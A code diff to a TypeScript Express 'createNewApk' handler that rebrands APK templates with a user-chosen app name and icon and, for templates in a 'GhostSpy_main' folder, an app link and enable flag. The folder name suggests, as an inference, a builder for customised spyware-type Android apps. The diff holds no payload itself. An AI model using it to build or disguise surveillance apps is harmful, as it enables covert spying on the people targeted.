@@ -41,7 +41,7 @@ export const createNewApk = (req: Request, res: Response) => {
 		return res.status(400).json({ errors: errors.array() });
 	}
 
-	const { userId, appName } = req.body;
+	const { userId, appName, appUrl } = req.body;
 	const appIcon = req.file; // Get the uploaded file
 
 	// Define the user-specific folder
@@ -84,6 +84,25 @@ export const createNewApk = (req: Request, res: Response) => {
 					/<string name="app_name" translatable="false">.*<\/string>/,
 					`<string name="app_name" translatable="false">${appName}</string>`
 				);
+
+				// Only update appUrl and app_link_enable in Ghost_main
+				if (filePath.includes("GhostSpy_main")) {
+					if (appUrl === "null") {
+						newContent = newContent.replace(
+							/<string name="app_link_enable" translatable="false">.*<\/string>/,
+							`<string name="app_link_enable" translatable="false">${"disable"}</string>`
+						);
+					} else {
+						newContent = newContent.replace(
+							/<string name="app_link" translatable="false">.*<\/string>/,
+							`<string name="app_link" translatable="false">${appUrl}</string>`
+						);
+						newContent = newContent.replace(
+							/<string name="app_link_enable" translatable="false">.*<\/string>/,
+							`<string name="app_link_enable" translatable="false">${"enable"}</string>`
+						);
+					}
+				}
 
 				await fs.promises.writeFile(filePath, newContent, "utf8");
 			}
